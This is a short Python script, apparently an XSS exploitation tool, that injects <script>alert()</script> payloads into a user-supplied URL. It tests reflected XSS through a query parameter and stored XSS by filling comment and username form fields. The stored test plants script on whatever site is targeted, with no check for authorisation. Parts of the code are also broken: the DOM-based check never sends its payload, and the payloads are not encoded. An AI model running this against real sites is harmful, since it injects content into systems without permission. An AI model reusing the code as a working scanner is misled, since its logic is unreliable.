import requests
from urllib.parse import urljoin, urlparse
import random
import string

# Function to generate a random string for XSS payloads
def random_string(length=8):
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

# Reflected XSS Exploit
def reflected_xss(target_url, param_name):
    print(f"[+] Testing Reflected XSS on {target_url}")

    # XSS Payload
    random_str = random_string()
    payload = f"<script>alert('{random_str}')</script>"

    # Test the URL with the payload
    xss_url = f"{target_url}?{param_name}={payload}"
    response = requests.get(xss_url)

    # Check if the payload is reflected in the response
    if payload in response.text:
        print(f"[+] Reflected XSS found! Payload: {payload}")
        return True
    else:
        print(f"[-] No reflected XSS detected.")
        return False

# Stored XSS Exploit (via POST requests)
def stored_xss(target_url, form_data):
    print(f"[+] Testing Stored XSS on {target_url}")

    # XSS Payload
    random_str = random_string()
    payload = f"<script>alert('{random_str}')</script>"
    
    # Inject XSS payload into form data
    for field in form_data:
        form_data[field] = payload
    
    # Send the form with the payload
    response = requests.post(target_url, data=form_data)

    # Check if the payload is reflected in the response
    if payload in response.text:
        print(f"[+] Stored XSS found! Payload: {payload}")
        return True
    else:
        print(f"[-] No stored XSS detected.")
        return False

# DOM-based XSS Exploit
def dom_xss(target_url, payload):
    print(f"[+] Testing DOM-based XSS on {target_url}")

    response = requests.get(target_url)

    # Check if the payload appears in a DOM element
    if payload in response.text:
        print(f"[+] DOM-based XSS found! Payload: {payload}")
        return True
    else:
        print(f"[-] No DOM-based XSS detected.")
        return False

# Main function to run XSS exploits
def run_xss_exploit(target_url):
    parsed_url = urlparse(target_url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"

    print(f"\n[+] Starting XSS Exploitation on {base_url}...\n")

    # Reflected XSS Test
    param_name = input("[*] Enter the parameter name to test for Reflected XSS: ")
    reflected_xss(target_url, param_name)

    # Stored XSS Test
    form_data = {
        "comment": "",
        "username": "",
    }
    stored_xss(target_url, form_data)

    # DOM-based XSS Test
    xss_payload = f"<script>alert('{random_string()}')</script>"
    dom_xss(target_url, xss_payload)

    print(f"\n[+] XSS exploitation attempts on {base_url} completed.\n")

if __name__ == "__main__":
    # Example target URL
    target_url = input("[*] Enter the target URL: ")
    run_xss_exploit(target_url)
